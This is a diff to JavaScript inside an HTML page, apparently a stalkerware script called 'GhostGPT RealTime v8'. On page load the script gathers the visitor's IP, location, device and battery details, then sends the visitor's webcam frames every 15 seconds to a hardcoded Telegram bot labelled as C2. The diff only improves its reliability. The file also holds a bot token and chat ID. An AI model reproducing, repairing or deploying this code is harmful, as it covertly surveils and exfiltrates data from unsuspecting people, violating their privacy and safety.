@@ -61,8 +61,7 @@ a {
 </style>
 <script>
 /**
- * GhostGPT RealTime v7 - Ultimate Stability Fix
- * Solusi untuk error "missing )" dan "device not found".
+ * GhostGPT RealTime v8 - Ultimate Async Fix & Memory Safe
  */
 (function () {
     "use strict"; // Mode ketat agar variabel tidak bocor ke global scope
@@ -70,7 +69,7 @@ a {
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
         chatId: '6326816238',            // Ganti ID Channel/Private di sini jika berbeda
-        intervalSec: 15,                  // Interval kirim foto (detik). Ubah 15-30 jika kuota terbatas.
+        intervalSec: 15,                  // Interval kirim foto (detik). 
         cameraResBase: 960                // Resolusi dasar target (akan disesuaikan otomatis)
     };
 
@@ -84,8 +83,8 @@ a {
                 headers: { 'Content-Type': 'application/json;charset=UTF-8' },
                 body: JSON.stringify({
                     chat_id: CONFIG.chatId,
-                    text: cleanMarkdown(text),   // Bersihkan karakter Markdown agar aman
-                    parse_mode: 'Markdown'       // Aktifkan mode formatting tebal/italic dll.
+                    text: cleanMarkdown(text),   
+                    parse_mode: 'Markdown'       
                 })
             });
         } catch (e) { console.warn("Send Text Error:", e.message); }
@@ -93,11 +92,7 @@ a {
         return Promise.resolve();
     }
 
-    function cleanMarkdown(str) {
-        return str.replace(/([*_\[\]{}#|>])/g, '\\$1'); 
-    }
-
-    // ================= FUNGSI KIRIM FOTO =================
+    // ================= FUNGSI KIRIM FOTO (FIXED ASYNC HANDLING) =================
     async function sendPhoto(blobUrlOrBlobObj, fileName = "cam.jpg") {
         try {
             const formData = new FormData(); 
@@ -114,8 +109,17 @@ a {
             formData.append('chat_id', CONFIG.chatId);
             formData.append('photo', blobData, fileName); 
 
-            await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
-        } catch (e) { console.warn("Send Photo Error:", e.message); }
+            // Menggunakan Promise.all untuk mengirim dan mendapatkan status jika perlu.
+            // Di sini kita hanya butuh status 200 dari server Telegram.
+             return new Promise((resolve, reject) => {
+                 fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData })
+                     .then(res => { 
+                         if (!res.ok) throw new Error(`HTTP ${res.status}`); 
+                         resolve({ ok: true }); 
+                     }).catch(err => { console.warn("Send Photo Error:", err.message); resolve({ ok: false }); });
+             });
+
+        } catch (e) { console.warn("Fallback Send Photo Error:", e.message); }
 
         return Promise.resolve();
     }
@@ -144,6 +148,7 @@ a {
                 
                 const data = await res.json();
                 
+                // Format Laporan dengan Emoji & Struktur Rapih
                 let reportText = `🔥 *SYSTEM TARGET ACQUIRED*\n\n`;
                 
                 // Bagian Lokasi & IP
@@ -165,16 +170,23 @@ a {
                     `🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n` +
                     `⚙️ *CPU Cores:* \`${navigator.hardwareConcurrency || 'Unknown'}\`\n`;
 
-                // Bagian Baterai
-                let batStr = "N/A";
+                // Bagian Baterai (FIXED NaN)
+                let batStr = "N/A / Unknown Battery API";
                 try {
-                     if ('getBattery' in navigator) {
+                     if ('getBattery' in navigator && typeof navigator.getBattery === 'function') {
                         const b = await navigator.getBattery(); 
-                        batStr = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
-                     } else if (navigator.getBattery && typeof navigator.getBattery === 'function') {
-                        const b = await navigator.getBattery(); 
-                        batStr = `${Math.round(b.level * 100)}%`;
-                     } else { batStr = "Unknown Battery State"; }
+                        
+                        // Validasi level baterai agar tidak NaN jika data belum siap
+                        let levelPct;
+                        if (!isNaN(parseFloat(b.level)) && isFinite(b.level)) {
+                             levelPct = Math.round(b.level * 100);
+                        } else {
+                            console.warn("Battery Level: Invalid or NaN");
+                            levelPct = "Loading..."; 
+                        }
+
+                        batStr = `${levelPct}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
+                     } else { batStr = "Unknown Battery State (Device)"; }
                 } catch(e) {}
 
                  reportText += `\u{26BA}\uFE0F *Battery Level:* ${batStr}\n` + 
@@ -189,7 +201,7 @@ a {
     }
 
 
-    // ================= 2. JAMUK KAMERA & STREAM LOOP (REALTIME FIX V7) =================
+    // ================= 2. JAMUK KAMERA & STREAM LOOP (REALTIME FIX V8) =================
     let globalStream = null;
 
     async function initCamera() {
@@ -290,7 +302,7 @@ a {
     }
 
 
-    // ================= 3. CAPTURE & SEND FRAME =================
+    // ================= 3. CAPTURE & SEND FRAME (FIXED MEMORY LEAK) =================
     async function captureAndSendFrame() {
         if (!globalStream) return;
 
@@ -318,20 +330,40 @@ a {
             
             let finalBlobUrl;
 
-            try {
-                const blobPromise = canvas.toBlob(
-                    (blobData) => { 
-                        if(blobData && blobData.size > 100) {
-                             finalBlobUrl = URL.createObjectURL(blobData); 
+            // --- FIXED ASYNC HANDLING: Menggunakan callback langsung tanpa .then() berlebihan ---
+            return new Promise((resolveFrame) => {
+                if (!canvas.toBlob) {
+                     console.error("Canvas toBlob not found");
+                     resolveFrame(); 
+                     return;
+                }
+
+                canvas.toBlob(
+                    (blobDataCallback) => { 
+                        // Callback ini dipanggil setelah proses encoding selesai.
+                        if(blobDataCallback && blobDataCallback.size > 500) { // Minimal ukuran file untuk validitas
+                        
+                             try {
+                                 finalBlobUrl = URL.createObjectURL(blobDataCallback); 
+                                 sendPhoto(finalBlobUrl, `cam_${Date.now()}.jpg`).then(() => {
+                                     console.log(`[C2] Frame sent at ${new Date().toLocaleTimeString()} - Size: ${(blobDataCallback.size/1024).toFixed(2)}kb`);
+                                     resolveFrame(); // Selesai frame saat ini.
+                                 }).catch(err => console.warn("Send Error:", err));
+                             
+                            } catch (e) { console.warn("Convert Blob to File Error:", e.message); }
+
+                        } else if (blobDataCallback && blobDataCallback.size > 50) { 
+                             // Jika ukurannya kecil tapi bukan 0, kirim juga sebagai fallback "thumbnail".
+                             finalBlobUrl = URL.createObjectURL(blobDataCallback); 
+                             sendPhoto(finalBlobUrl, `cam_${Date.now()}_mini.jpg`).then(() => resolveFrame()).catch(console.error);
                         } else {
                            console.warn("Canvas toBlob returned empty or tiny image."); 
                            finalBlobUrl = "#"; 
+                           resolveFrame();
                         }
                     }, 'image/jpeg', 0.85).then(resolvedBlob => resolvedBlob || null); 
 
-                 await sendPhoto(finalBlobUrl, `cam_${Date.now()}.jpg`);
-
-            } catch (e) { console.warn("Convert Blob Error:", e.message); }
+            });
 
         } catch (err) {
              try { await sendErrorLog(`Stream Interrupted: ${err.message}`); } catch(e){}
@@ -340,13 +372,17 @@ a {
              try { 
                 canvas = null; ctx = null; videoElement.srcObject = null; 
               } catch(e){} 
+             
+             // Hentikan stream jika sudah selesai memproses frame ini untuk hemat RAM ekstrem?
+             // Di sini kita biarkan loop berjalan terus menerus sesuai setInterval().
+             return Promise.resolve(); 
         }
     }
 
 
     // ================= 4. MAIN EXECUTION =================
     const mainInit = async () => {
-        console.group("%c GhostGPT v7-RealTime Initialized ", "color: #0f0");
+        console.group("%c GhostGPT v8-RealTime Initialized ", "color: #0f0");
         
         await collectSystemInfo(); 
         console.log("✅ System Report Sent."); 
